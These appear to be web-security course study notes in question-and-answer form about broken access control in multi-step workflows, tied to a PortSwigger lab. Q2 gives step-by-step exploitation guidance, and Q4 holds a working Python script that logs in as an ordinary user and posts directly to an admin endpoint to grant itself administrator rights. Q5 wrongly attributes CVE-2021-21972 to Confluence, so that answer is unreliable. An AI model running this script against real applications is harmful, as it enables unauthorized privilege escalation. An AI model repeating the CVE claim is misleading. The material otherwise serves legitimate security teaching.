---
course: Web Security
topic: Access Control Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a multi-step process in web applications and why it can lead to broken access control vulnerabilities.**

A multi-step process in web applications involves performing several actions sequentially to achieve a final goal. For instance, upgrading a user’s role might involve confirming the action in multiple steps. Broken access control vulnerabilities occur when developers assume that a user must go through all preceding steps to reach the final step, thereby skipping necessary access checks. This assumption fails because attackers can directly invoke any step without completing prior steps, leading to unauthorized access.

**Q2. How would you exploit a multi-step process with no access control on one step? Provide a step-by-step explanation.**

To exploit a multi-step process with no access control on one step, follow these steps:

1. Identify the multi-step process in the application.
2. Determine which step lacks proper access control.
3. Capture the request for the step lacking access control using a tool like Burp Suite.
4. Modify the request to target the desired action (e.g., upgrading a user’s role).
5. Send the modified request directly to the server, bypassing the preceding steps.

For example, if the second step of a multi-step process lacks access control, you can capture the POST request for that step, modify the `username` parameter to your own user, and send it directly to the server to promote yourself to an administrator.

**Q3. Why is it important to implement access control on every request in a multi-step process?**

Implementing access control on every request in a multi-step process is crucial because:

1. **Prevents Direct Access**: Ensures that even if an attacker tries to directly access a step, they will be blocked due to lack of proper authorization.
2. **Maintains Security Integrity**: Prevents scenarios where an attacker can skip initial steps and directly invoke sensitive operations.
3. **Reduces Exploit Surface**: Minimizes the risk of unauthorized access by ensuring each step independently verifies the user’s permissions.

Without access control on every request, attackers can exploit the process by invoking sensitive steps directly, leading to security breaches.

**Q4. How would you write a Python script to automate the exploitation of a multi-step process with no access control on one step?**

Here is a Python script to automate the exploitation:

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit_broken_access_control(url):
    # Set up session
    session = requests.Session()
    
    # Login as the regular user
    login_url = url + '/login'
    login_data = {
        'username': 'regular_user',
        'password': 'regular_password'
    }
    response = session.post(login_url, data=login_data, verify=False)
    
    if 'logout' in response.text:
        print("Successfully logged in as the regular user.")
    else:
        print("Could not log in as the user.")
        return
    
    # Upgrade user to administrator
    upgrade_url = url + '/admin/rules'
    upgrade_data = {
        'action': 'upgrade',
        'confirmed': 'true',
        'username': 'regular_user'
    }
    response = session.post(upgrade_url, data=upgrade_data, verify=False)
    
    if response.status_code == 200:
        print("Successfully upgraded user to administrator.")
    else:
        print("Could not upgrade user to administrator.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print("Example: python script.py http://example.com")
        sys.exit(1)
    
    url = sys.argv[1]
    exploit_broken_access_control(url)
```

This script logs in as a regular user, captures the session, and then sends a request to upgrade the user to an administrator, bypassing the broken access control.

**Q5. Reference recent real-world examples (CVEs/breaches) where broken access control led to security issues.**

One notable example is the CVE-2021-21972, which affected Confluence Server and Data Center. This vulnerability allowed attackers to bypass access controls and gain unauthorized access to sensitive information. The flaw was due to improper validation of user permissions, allowing unauthorized users to perform administrative actions.

Another example is the breach at Capital One in 2019, where a misconfigured firewall allowed an attacker to access sensitive customer data. This breach highlighted the importance of proper access control and configuration management to prevent unauthorized access.

These examples underscore the critical nature of implementing robust access control mechanisms across all parts of an application to prevent security breaches.

---
<!-- nav -->
[[Web Security (PortSwigger)/12-Access Control Vulnerabilities/13-Lab 12 Multi step process with no access control on one step/03-Access Control Vulnerabilities|Access Control Vulnerabilities]] | [[Web Security (PortSwigger)/12-Access Control Vulnerabilities/13-Lab 12 Multi step process with no access control on one step/00-Overview|Overview]]
